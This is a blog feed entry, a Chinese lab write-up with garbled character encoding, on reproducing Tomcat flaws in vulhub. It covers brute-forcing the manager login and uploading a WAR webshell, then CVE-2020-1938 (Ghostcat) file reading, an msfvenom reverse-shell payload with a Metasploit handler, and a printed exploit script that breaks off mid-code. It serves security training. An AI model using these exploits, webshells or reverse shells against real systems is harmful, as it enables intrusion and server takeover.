<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>æ¢¦~é†’ğŸ¥</title>
  
  
  <link href="https://blog.m3x1.cn/atom.xml" rel="self"/>
  
  <link href="https://blog.m3x1.cn/"/>
  <updated>2025-03-28T07:08:45.608Z</updated>
  <id>https://blog.m3x1.cn/</id>
  
  <author>
    <name>æ¢¦~é†’ğŸ¥</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ã€vulhubæ¼æ´é¶åœºã€‘tomcatæ¼æ´åŠæ¼æ´å¤ç°</title>
    <link href="https://blog.m3x1.cn/posts/a96128fe.html"/>
    <id>https://blog.m3x1.cn/posts/a96128fe.html</id>
    <published>2025-03-27T16:00:00.000Z</published>
    <updated>2025-03-28T07:08:45.608Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="tomcat8">tomcat8</h2><blockquote><p>kalié¶æœºï¼š192.168.192.132</p><p>win10æ”»å‡»æœºï¼š192.168.192.129</p></blockquote><h3 id="ç¯å¢ƒè¯´æ˜">ç¯å¢ƒè¯´æ˜</h3><p>Tomcatæ”¯æŒåœ¨åå°éƒ¨ç½²waræ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥å°†webshelléƒ¨ç½²åˆ°webç›®å½•ä¸‹ã€‚å…¶ä¸­ï¼Œæ¬²è®¿é—®åå°ï¼Œéœ€è¦å¯¹åº”ç”¨æˆ·æœ‰ç›¸åº”æƒé™ã€‚</p><p>Tomcat7+æƒé™åˆ†ä¸ºï¼š</p><ul><li>managerï¼ˆåå°ç®¡ç†ï¼‰<ul><li>manager-gui æ‹¥æœ‰htmlé¡µé¢æƒé™</li><li>manager-status æ‹¥æœ‰æŸ¥çœ‹statusçš„æƒé™</li><li>manager-script æ‹¥æœ‰textæ¥å£çš„æƒé™ï¼Œå’Œstatusæƒé™</li><li>manager-jmx æ‹¥æœ‰jmxæƒé™ï¼Œå’Œstatusæƒé™</li></ul></li><li>host-managerï¼ˆè™šæ‹Ÿä¸»æœºç®¡ç†ï¼‰<ul><li>admin-gui æ‹¥æœ‰htmlé¡µé¢æƒé™</li><li>admin-script æ‹¥æœ‰textæ¥å£æƒé™</li></ul></li></ul><h3 id="æ¼æ´å¤ç°">æ¼æ´å¤ç°</h3><p>é¶æœºè¿›å…¥vulhub-master/tomcat/tomcat8,å¯åŠ¨docker</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326165628798.png" alt="image-20250326165628798"></p><p>å¼€å¯ç¯å¢ƒä¹‹åæµè§ˆå™¨æ‰“å¼€ï¼Œå¦‚æœä¸çŸ¥é“tomcatçš„åå°ç®¡ç†é¡µé¢ä¸ºmanagerçš„è¯ï¼Œåœ¨æœ¬ç¯å¢ƒä¸­ä¹Ÿå¯ä»¥è‡ªå·±æ‘¸ç´¢å‡ºç™»å½•æ¡†ï¼Œç‚¹å‡»å›¾ä¸­ä»»æ„ä¸‰ä¸ªè¯·æ±‚ä¹‹åä¹Ÿèƒ½å‘ç°ç™»å½•æ¡†</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/28ff0661acc62e0ea2101b28b2618fa2.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/415b65ab170d2bced11bac4a83b0dc4c.png" alt="img"></p><p>æ‰¾åˆ°ç™»å½•é¡µé¢ä¹‹åå°è¯•tomcatçš„å¼±å£ä»¤,å…ˆæŠ“åŒ…å‘ç°ä¸€ä¸ªbaseç¼–ç </p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327103117221.png" alt="image-20250327103117221"></p><p>è§£ç å‘ç°ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327103239255.png" alt="image-20250327103239255"></p><p>ç„¶åçŸ¥é“äº†ä»–ä¼ é€’è´¦æˆ·å¯†ç çš„æ–¹å¼ï¼Œå°±å¯ä»¥è¿›è¡Œçˆ†ç ´äº†</p><p>çˆ†ç ´å‡ºæ¥æ˜¯tomcat:tomcat</p><p>ä¹‹åå°±å‘ç°å¯ä»¥è¿›è¡Œä¸Šä¼ æ–‡ä»¶çš„æ“ä½œ</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5c38eb17fb273c5faedc1f3a0fab82ee.png" alt="img"></p><p>æ¥ä¸‹æ¥å…ˆç”¨å“¥æ–¯æ‹‰ç”Ÿæˆä¸€ä¸ªjspæ–‡ä»¶</p><p>ç„¶åç”¨javaå‘½ä»¤ï¼Œå°†å®ƒæ‰“åŒ…æˆwaræ ¼å¼ï¼šï¼ˆæˆ–è€…å°†jspæ–‡ä»¶å‹ç¼©æˆzipæ–‡ä»¶ï¼Œç„¶åä¿®æ”¹åç¼€ä¸ºwarï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cvf shell.war shell.jsp</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327111550121.png" alt="image-20250327111550121"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327111635208.png" alt="image-20250327111635208"></p><p>ä¸Šä¼ waråŒ…getshellï¼Œä¸Šä¼ å®Œæˆä¹‹åå°±å¯ä»¥çœ‹åˆ°å¤šäº†ä¸€æ æ•°æ®</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7b396b9105f6d2d1b7ffa12aaa272cb9.png" alt="img"></p><p>ç„¶åè®¿é—®è·¯å¾„ä¸º/shell/shell.jspï¼Œå¦‚æœèƒ½è®¿é—®æˆåŠŸï¼Œå°±è¯´æ˜æˆåŠŸäº†ã€‚</p><p>æ‰“å¼€å“¥æ–¯æ‹‰è¿›è¡Œè¿æ¥ï¼ŒæˆåŠŸæ‹¿åˆ°shell</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327112003498.png" alt="image-20250327112003498"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327112312284.png" alt="image-20250327112312284"></p><h2 id="CVE-2020-1938">CVE-2020-1938</h2><blockquote><p>kalié¶æœºï¼š192.168.192.132</p><p>kaliæ”»å‡»æœºï¼š192.168.192.133</p></blockquote><p>Tomcat æ˜¯å½“å‰æœ€æµè¡Œçš„ Java ä¸­é—´ä»¶æœåŠ¡å™¨ä¹‹ä¸€ï¼Œä»åˆç‰ˆå‘å¸ƒåˆ°ç°åœ¨å·²ç»æœ‰äºŒåå¤šå¹´å†å²ï¼Œåœ¨ä¸–ç•ŒèŒƒå›´å†…å¹¿æ³›ä½¿ç”¨ã€‚Ghostcatæ˜¯ç”±é•¿äº­ç§‘æŠ€å®‰å…¨ç ”ç©¶å‘˜å‘ç°çš„å­˜åœ¨äº Tomcat ä¸­çš„å®‰å…¨æ¼æ´ï¼Œç”±äº Tomcat AJP åè®®è®¾è®¡ä¸Šå­˜åœ¨ç¼ºé™·ï¼Œæ”»å‡»è€…é€šè¿‡ Tomcat AJP Connector å¯ä»¥è¯»å–æˆ–åŒ…å« Tomcat ä¸Šæ‰€æœ‰ webapp ç›®å½•ä¸‹çš„ä»»æ„æ–‡ä»¶ï¼Œä¾‹å¦‚å¯ä»¥è¯»å– webapp é…ç½®æ–‡ä»¶æˆ–æºä»£ç ã€‚æ­¤å¤–åœ¨ç›®æ ‡åº”ç”¨æœ‰æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½çš„æƒ…å†µä¸‹ï¼Œé…åˆæ–‡ä»¶åŒ…å«çš„åˆ©ç”¨è¿˜å¯ä»¥è¾¾åˆ°è¿œç¨‹ä»£ç æ‰§è¡Œçš„å±å®³ã€‚</p><p>tomcat é…ç½®äº†ä¸¤ä¸ªConnectoï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯ HTTP å’Œ AJP ï¼šHTTPé»˜è®¤ç«¯å£ä¸º8080ï¼Œå¤„ç†httpè¯·æ±‚ï¼Œè€ŒAJPé»˜è®¤ç«¯å£8009ï¼Œç”¨äºå¤„ç† AJP åè®®çš„è¯·æ±‚ï¼Œè€ŒAJPæ¯”httpæ›´åŠ ä¼˜åŒ–ï¼Œå¤šç”¨äºåå‘ã€é›†ç¾¤ç­‰ï¼Œæ¼æ´ç”±äºTomcat AJPåè®®å­˜åœ¨ç¼ºé™·è€Œå¯¼è‡´ï¼Œæ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´å¯é€šè¿‡æ„é€ ç‰¹å®šå‚æ•°ï¼Œè¯»å–æœåŠ¡å™¨webappä¸‹çš„ä»»æ„æ–‡ä»¶ä»¥åŠå¯ä»¥åŒ…å«ä»»æ„æ–‡ä»¶ï¼Œå¦‚æœæœ‰æŸä¸Šä¼ ç‚¹ï¼Œä¸Šä¼ å›¾ç‰‡é©¬ç­‰ç­‰ï¼Œå³å¯ä»¥è·å–shellã€‚</p><p>ç¯å¢ƒå¯åŠ¨ä¹‹åï¼Œè¿›è¡Œç«¯å£æ‰«æ</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327202910328.png" alt="image-20250327202910328"></p><p>çœ‹åˆ°æœ‰ä¸ªé™Œç”Ÿçš„ajp13åè®®ï¼Œæœç´¢å¾—çŸ¥è¿™æ˜¯ä¸ªå®šå‘åŒ…åè®®ã€‚å› ä¸ºæ€§èƒ½åŸå› ï¼Œä½¿ç”¨äºŒè¿›åˆ¶æ ¼å¼æ¥ä¼ è¾“å¯è¯»æ€§æ–‡æœ¬ã€‚</p><blockquote><p><strong>AJP13</strong>æ˜¯Apache Tomcatä¸­ä½¿ç”¨çš„ä¸€ç§é«˜æ•ˆçš„äºŒè¿›åˆ¶åè®®ï¼Œå®ƒå…è®¸WebæœåŠ¡å™¨ä¸Servletå®¹å™¨ä¹‹é—´é€šè¿‡TCPè¿æ¥è¿›è¡Œé€šä¿¡ã€‚è¿™ç§åè®®çš„è®¾è®¡ç›®çš„æ˜¯ä¸ºäº†æé«˜æ€§èƒ½ï¼Œå› ä¸ºå®ƒä½¿ç”¨äºŒè¿›åˆ¶æ ¼å¼ä¼ è¾“å¯è¯»æ€§æ–‡æœ¬ï¼Œä»è€Œå‡å°‘äº†å¤„ç†socketè¿æ¥çš„å¼€é”€ã€‚åœ¨AJP13åè®®ä¸­ï¼ŒWebæœåŠ¡å™¨å’ŒServletå®¹å™¨ä¹‹é—´å°è¯•ä¿æŒæŒä¹…æ€§çš„TCPè¿æ¥ï¼Œä»¥ä¾¿åœ¨å¤šä¸ªè¯·æ±‚/å“åº”å¾ªç¯ä¸­é‡ç”¨åŒä¸€ä¸ªè¿æ¥ã€‚è¿™æ„å‘³ç€ï¼Œä¸€æ—¦è¿æ¥è¢«åˆ†é…ç»™ç‰¹å®šè¯·æ±‚ï¼Œåœ¨è¯·æ±‚å¤„ç†ç»“æŸä¹‹å‰ï¼Œè¯¥è¿æ¥ä¸ä¼šå†æ¬¡åˆ†é…ç»™å…¶ä»–è¯·æ±‚ã€‚</p></blockquote><p>è®¿é—®8080ç«¯å£ï¼Œæ˜¯ä¸ªtomcatçš„é¡µé¢ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬åˆ©ç”¨pocè¿›è¡Œæ¼æ´æ£€æµ‹ã€‚è‹¥å­˜åœ¨æ¼æ´åˆ™å¯ä»¥æŸ¥çœ‹webappsç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</span><br><span class="line">cd CNVD-2020-10487-Tomcat-Ajp-lfi</span><br><span class="line">python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f /WEB-INF/æ–‡ä»¶å é¶æœºip   #py2ç¯å¢ƒ</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327204718269.png" alt="image-20250327204718269"></p><p>çœ‹åˆ°èƒ½æˆåŠŸè¯»å–web.xmlæ–‡ä»¶ï¼Œå°±æ˜¯éªŒè¯äº†æ¼æ´å­˜åœ¨ã€‚</p><p>éªŒè¯å®Œæˆä¹‹åå°±å¯ä»¥è¿›è¡Œæ¼æ´åˆ©ç”¨çš„æ“ä½œäº†</p><p>å…ˆåœ¨é¶æœºåˆ©ç”¨msfç”Ÿæˆä¸€ä¸ªjspæœ¨é©¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.192.133 LPORT=4444 R &gt;shell.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327205509964.png" alt="image-20250327205509964"></p><p>æ¥ç€æŠŠæœ¨é©¬ä¸Šä¼ åˆ°dockerå®¹å™¨ä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp shell.txt ae1efd71d43f:/usr/local/tomcat/webapps/ROOT/WEB-INF/</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327205849367.png" alt="image-20250327205849367"></p><p>è¿›å…¥dockerå®¹å™¨æ£€æŸ¥ä¸€ä¸‹ï¼Œå‡ºç°shell.txtï¼Œè¯´æ˜ä¸Šä¼ æˆåŠŸã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -ti å®¹å™¨id bash</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327205924843.png" alt="image-20250327205924843"></p><p>æˆ‘ä»¬è¯•ç€åœ¨æ”»å‡»æœºä¸Šåˆ©ç”¨pocè¯»å–shell.txtæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f /WEB-INF/shell.txt é¶æœºip   #py2ç¯å¢ƒ</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327211933141.png" alt="image-20250327211933141"> è¯»å–æˆåŠŸï¼Œå®ç°äº†ä»»æ„æ–‡ä»¶è¯»å–çš„æ¼æ´éªŒè¯ã€‚æ¥ä¸‹æ¥è¿›è¡Œæ¼æ´åˆ©ç”¨æ¥getshellã€‚</p><p>ä¸Šä¼ å®Œæˆä¹‹åï¼Œæ”»å‡»æœºè¿›å…¥msfè¿›è¡Œç«¯å£ç›‘å¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload java/jsp_shell_reverse_tcp</span><br><span class="line">set lhost æ”»å‡»æœºip</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327210622683.png" alt="image-20250327210622683"></p><p>ä¹‹åå†åˆ©ç”¨expè¿›è¡Œåå¼¹shellã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python CNVD-2020-10487-Tomcat-Ajp-lfi-rce.py -p 8009 192.168.192.132 --rce 1 -f /WEB-INF/shell.txt</span><br><span class="line">#æ³¨æ„è¿™ä¸ªexpæ˜¯ä¿®æ”¹äº†çš„ï¼Œä¸æ˜¯åŸæ¥çš„expï¼Œæºä»£ç å¦‚ä¸‹ã€‚éœ€è¦ä½¿ç”¨python3è¿è¡Œï¼Œå…¶ä»–éƒ½å·®ä¸å¤šï¼Œå¤šäº†ä¸€ä¸ª--rceå‚æ•°è¿›è¡Œç¼–è¯‘è¿è¡Œjspæ–‡ä»¶ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># CNVD-2020-10487  Tomcat-Ajp lfi</span><br><span class="line"># by ydhcui</span><br><span class="line">import struct</span><br><span class="line">import io</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Some references:</span><br><span class="line"># https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html</span><br><span class="line">def pack_string(s):</span><br><span class="line">    if s is None:</span><br><span class="line">        return struct.pack(&quot;&gt;h&quot;, -1)</span><br><span class="line">    l = len(s)</span><br><span class="line">    return struct.pack(&quot;&gt;H%dsb&quot; % l, l, s.encode(&#x27;utf8&#x27;), 0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def unpack(stream, fmt):</span><br><span class="line">    size = struct.calcsize(fmt)</span><br><span class="line">    buf = stream.read(size)</span><br><span class="line">    return struct.unpack(fmt, buf)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def unpack_string(stream):</span><br><span class="line">    size, = unpack(stream, &quot;&gt;h&quot;)</span><br><span class="line">    if size == -1:  # null string</span><br><span class="line">        return None</span><br><span class="line">    res, = unpack(stream, &quot;%ds&quot; % size)</span><br><span class="line">    stream.read(1)  # \0</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class NotFoundException(Exception):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AjpBodyRequest(object):</span><br><span class="line">    # server == web server, container == servlet</span><br><span class="line">    SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)</span><br><span class="line">    MAX_REQUEST_LENGTH = 8186</span><br><span class="line"></span><br><span class="line">    def __init__(self, data_stream, data_len, data_direction=None):</span><br><span class="line">        self.data_stream = data_stream</span><br><span class="line">        self.data_len = data_len</span><br><span class="line">        self.data_direction = data_direction</span><br><span class="line"></span><br><span class="line">    def serialize(self):</span><br><span class="line">        data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)</span><br><span class="line">        if len(data) == 0:</span><br><span class="line">            return struct.pack(&quot;&gt;bbH&quot;, 0x12, 0x34, 0x00)</span><br><span class="line">        else:</span><br><span class="line">            res = struct.pack(&quot;&gt;H&quot;, len(data))</span><br><span class="line">            res += data</span><br><span class="line">        if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:</span><br><span class="line">            header = struct.pack(&quot;&gt;bbH&quot;, 0x12, 0x34, len(res))</span><br><span class="line">        else:</span><br><span class="line">            header = struct.pack(&quot;&gt;bbH&quot;, 0x41, 0x42, len(res))</span><br><span class="line">        return header + res</span><br><span class="line"></span><br><span class="line">    def send_and_receive(self, socket, stream):</span><br><span class="line">        while True:</span><br><span class="line">            data = self.serialize()</span><br><span class="line">            socket.send(data)</span><br><span class="line">            r = AjpResponse.receive(stream)</span><br><span class="line">            while r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS:</span><br><span class="line">                r = AjpResponse.receive(stream)</span><br><span class="line"></span><br><span class="line">            if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4:</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AjpForwardRequest(object):</span><br><span class="line">    _, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(</span><br><span class="line">        28)</span><br><span class="line">    REQUEST_METHODS = &#123;&#x27;GET&#x27;: GET, &#x27;POST&#x27;: POST, &#x27;HEAD&#x27;: HEAD, &#x27;OPTIONS&#x27;: OPTIONS, &#x27;PUT&#x27;: PUT, &#x27;DELETE&#x27;: DELETE,</span><br><span class="line">                       &#x27;TRACE&#x27;: TRACE&#125;</span><br><span class="line">    # server == web server, container == servlet</span><br><span class="line">    SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)</span><br><span class="line">    COMMON_HEADERS = [&quot;SC_REQ_ACCEPT&quot;,</span><br><span class="line">                      &quot;SC_REQ_ACCEPT_CHARSET&quot;, &quot;SC_REQ_ACCEPT_ENCODING&quot;, &quot;SC_REQ_ACCEPT_LANGUAGE&quot;,</span><br><span class="line">                      &quot;SC_REQ_AUTHORIZATION&quot;,</span><br><span class="line">                      &quot;SC_REQ_CONNECTION&quot;, &quot;SC_REQ_CONTENT_TYPE&quot;, &quot;SC_REQ_CONTENT_LENGTH&quot;, &quot;SC_REQ_COOKIE&quot;,</span><br><span class="line">                      &quot;SC_REQ_COOKIE2&quot;,</span><br><span class="line">                      &quot;SC_REQ_HOST&quot;, &quot;SC_REQ_PRAGMA&quot;, &quot;SC_REQ_REFERER&quot;, &quot;SC_REQ_USER_AGENT&quot;</span><br><span class="line">                      ]</span><br><span class="line">    ATTRIBUTES = [&quot;context&quot;, &quot;servlet_path&quot;, &quot;remote_user&quot;, &quot;auth_type&quot;, &quot;query_string&quot;, &quot;route&quot;, &quot;ssl_cert&quot;,</span><br><span class="line">                  &quot;ssl_cipher&quot;, &quot;ssl_session&quot;, &quot;req_attribute&quot;, &quot;ssl_key_size&quot;, &quot;secret&quot;, &quot;stored_method&quot;]</span><br><span class="line"></span><br><span class="line">    def __init__(self, data_direction=None):</span><br><span class="line">        self.prefix_code = 0x02</span><br><span class="line">        self.method = None</span><br><span class="line">        self.protocol = None</span><br><span class="line">        self.req_uri = None</span><br><span class="line">        self.remote_addr = None</span><br><span class="line">        self.remote_host = None</span><br><span class="line">        self.server_name = None</span><br><span class="line">        self.server_port = None</span><br><span class="line">        self.is_ssl = None</span><br><span class="line">        self.num_headers = None</span><br><span class="line">        self.request_headers = None</span><br><span class="line">        self.attributes = None</span><br><span class="line">        self.data_direction = data_direction</span><br><span 